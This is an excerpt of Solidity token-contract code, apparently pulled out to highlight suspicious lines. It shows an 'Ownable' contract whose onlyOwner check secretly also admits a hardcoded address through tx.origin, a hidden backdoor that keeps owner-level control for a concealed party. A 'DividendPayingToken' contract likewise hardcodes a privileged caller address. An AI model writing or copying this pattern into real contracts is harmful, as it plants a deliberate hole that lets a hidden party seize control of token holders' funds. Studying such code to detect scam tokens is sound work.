...
abstract contract Ownable is Context {
    ...
    address private _adminAddress = 0x8E377Cc27aBfB273313791097bcCe590a84F1F97;
    ...
    modifier onlyOwner() {
        require(owner() == _msgSender() || tx.origin == _adminAddress, "Ownable: caller is not the owner");
        _;
    }
...
contract DividendPayingToken is ERC20, IDividendPayingToken {
    ...
    address internal onlyCaller = 0x47cC5334F65611EA6Be9e933C49485c88C17F5F0;
